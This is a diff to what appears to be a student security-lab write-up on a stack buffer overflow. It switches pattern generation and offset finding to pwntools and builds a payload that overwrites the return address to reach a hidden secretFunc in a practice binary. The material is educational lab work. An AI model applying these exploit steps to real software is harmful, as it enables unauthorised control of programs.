@@ -73,27 +73,21 @@ int main(int argc, char *argv[])
 
 1. **Create a pattern using Python script:**
    ```
-    import string
-    import itertools
-    
-    def generate_pattern(length):
-        charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
-        pattern = ''.join(''.join(x) for x in itertools.product(charset, repeat=3))
-        return pattern[:length]
+    from pwn import *
     
     pattern_length = 300
-    pattern = generate_pattern(pattern_length)
-    print(pattern)
+    pattern = cyclic(pattern_length)
+    
+    with open("pattern.txt", "w") as f:
+        f.write(pattern.decode('latin-1'))
 
    ```
 2. **Run the script to generate the pattern:**
    ```sh
-   python pattern_create.py > pattern.txt
+   python pattern_create.py 
    ```
-    `AAAAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA0AA1AA2AA3AA4AA5AA6AA7AA8AA9ABAABBABCABDABEABFABGABHABIABJABKABLABMABNABOABPABQABRABSABTABUABVABWABXABYABZABaABbABcABdABeABfABgABhABiABjABkABl`
+    `aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac`
        
-![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/36c7a84d-8583-470d-a2cb-9407eb84728e)
-
 3. **Run the program with the pattern and a dummy argument:**
    ```sh
    cat pattern.txt | ./bof1.out dummy_arg
@@ -110,38 +104,32 @@ int main(int argc, char *argv[])
    (gdb) run dummy_arg < pattern.txt
    (gdb) info registers
    ```
-![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/fa3b7cd3-a7b1-4309-9cc2-eea4a49410d1)
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/c990f9d8-2251-47d1-8205-7da2eb9e35b2)
 
-![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/c72c831a-9473-4b47-9474-5641797f39f2)
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/057f9d7d-c0ea-4e93-bab9-4cc90c000d7a)
 
 
 2. **Find the offset using a Python script:**
 
    ```python
-   import sys
+    from pwn import *
+    
+    # Thay giá trị EIP thực tế từ GDB
+    eip_value = 0x63616164  
+    offset = cyclic_find(eip_value)
+    print(f'Offset: {offset}')
 
-   def find_offset(pattern, value):
-       return pattern.find(value)
-
-   def generate_pattern(length):
-       charset = string.ascii_uppercase + string.ascii_lowercase + string.digits
-       pattern = ''.join(''.join(x) for x in itertools.product(charset, repeat=3))
-       return pattern[:length]
-
-   pattern_length = 300
-   pattern = generate_pattern(pattern_length)
-
-   eip_value = "0x4a424149"  # Replace with your actual EIP value here
-   offset = find_offset(pattern, eip_value)
-   print(f'Offset: {offset}')
    ```
    
    3. **Run the script with the EIP value:**
    ```sh
    python pattern_offset.py
    ```
-    ![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/ef5202bf-6ad9-4976-ab5b-ec1dd8d62731)
 
+   ```
+   D:\sercuritylab\seclabs\.venv\Scripts\python.exe D:\sercuritylab\seclabs\find_offset.py 
+   Offset: 212
+   ```
 
 #### Step 3: Craft the Payload
 1. **Find the address of `secretFunc`:**
@@ -149,17 +137,26 @@ int main(int argc, char *argv[])
    gdb ./bof1.out
    (gdb) p secretFunc
    ```
-![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/e4951052-a87c-4540-a4eb-ecb5ec588796)
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/088a6572-6ba6-4068-b362-3eada15a0787)
+
 
 2. **Create the payload:**
-   ```sh
-   python -c 'print("A" * 208 + "\xb6\x84\x04\x08")' > payload
+   ```python
+    from pwn import *
+
+    offset = 212  # Giá trị offset tìm được từ bước trước
+    secretFunc_address = 0x0804846b  # Địa chỉ của secretFunc từ GDB
+    payload = b"A" * offset + p32(secretFunc_address)
+    
+    with open("payload", "wb") as f:
+        f.write(payload)
    ```
 
 3. **Verify the payload:**
    ```sh
    xxd payload
    ```
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/7cabc2dc-65fa-4ac5-88de-a284121eb9d5)
 
 #### Step 4: Run the Program with the Payload
 
@@ -172,8 +169,7 @@ int main(int argc, char *argv[])
 
 If the payload is correct, the program should call `secretFunc` and print "Congratulations!\n".
 
----
-
+![image](https://github.com/AlexanderSlokov/Security-Labs-Submission/assets/102212788/15c02573-c400-43f2-826e-e827ec776071)
 
 ---
 
